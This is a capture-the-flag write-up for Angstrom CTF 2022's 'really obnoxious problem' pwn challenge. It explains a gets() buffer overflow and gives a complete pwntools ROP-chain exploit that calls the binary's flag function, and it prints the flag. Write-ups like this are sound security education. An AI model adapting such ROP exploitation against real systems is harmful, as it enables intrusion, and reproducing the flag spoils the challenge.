---
title: "[Pwn] really obnoxious problem [Angstrom CTF 2022]"
date: 2022-05-07 00:02:00
---

# 0x0 Introduction

You know the drill.

nc challs.actf.co 31225

Author: JoshDaBosh

files: [really_obnoxious_problem](really_obnoxious_problem)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


# 0x2 Vulnerability

simple buffer overflow, `main` function use `gets`. overwrite rip to a ropchain that calls `sym.flag`. 

`sym.flag` check two parameter, so we also need set `rdi` and `rsi` to the correct value in the ropchain.


# 0x3 Exploit

```
from pwn import *

io = connect("challs.actf.co",31225)
exe = context.binary = ELF("really_obnoxious_problem")
exe_rop = ROP(exe)
ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]
# pop_rsi_ret_addr = exe_rop.find_gadget(['pop rsi', 'ret'])[0]
io.sendlineafter(b"Name:",b"bobby"+b'A'*(49-5))
io.sendlineafter(b"Address:",flat({
    0x40+0x8:[
        pop_rdi_ret_addr,
        0x1337,
        0x00000000004013f1, # pop rsi, pop something ret
        exe.symbols["name"],
        0,
        exe.sym["flag"]
    ]}))

io.interactive()

```

# 0x4 Flag

actf{so_swe3t_so_c0ld_so_f4ir_7167cfa2c019}